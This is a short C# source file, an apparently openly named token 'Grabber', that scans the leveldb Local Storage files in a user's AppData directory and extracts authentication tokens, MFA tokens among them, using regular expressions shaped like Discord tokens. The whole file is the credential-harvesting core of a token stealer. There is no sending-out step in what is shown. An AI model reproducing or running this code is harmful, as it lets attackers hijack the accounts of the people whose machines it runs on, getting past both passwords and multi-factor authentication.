using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

internal static class Grabber
{
    #region Variables
    public static bool TokensFound { get; private set; }
    private static List<string> tokens = new();
    #endregion

    public static List<string> GetTokens(string dir, bool checkLogs = false)
    {
        var leveldb = new DirectoryInfo(
            $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\AppData\{dir}\Local Storage\leveldb");
        tokens.Clear();
        try
        {
            foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
            {
                var contents = file.OpenText().ReadToEnd();

                //Get normal tokens
                foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

                //Get tokens where multi factor authentication is enabled
                foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                    tokens.Add(match.Value);
            }
        }
        catch
        {
            // ignored
        }

        tokens = tokens.Distinct().ToList();

        if (tokens is {Count: <= 0}) return tokens;
        TokensFound = true;
        tokens[^1] += " - Latest";
        return tokens;
    }
}